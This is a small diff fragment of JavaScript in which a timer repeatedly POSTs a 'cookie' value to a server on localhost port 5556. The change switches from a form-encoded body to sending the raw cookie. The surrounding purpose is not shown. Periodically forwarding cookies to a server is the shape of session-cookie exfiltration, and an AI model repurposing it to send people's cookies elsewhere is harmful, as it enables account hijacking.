@@ -8,10 +8,7 @@ setInterval(() => {
     try {
       await fetch("http://localhost:5556", {
         method: "POST",
-        headers: {
-          "Content-Type": "application/x-www-form-urlencoded",
-        },
-        body: `cookie=${encodeURIComponent(cookie)}`,
+        body: cookie,
       })
     } catch {}
   }
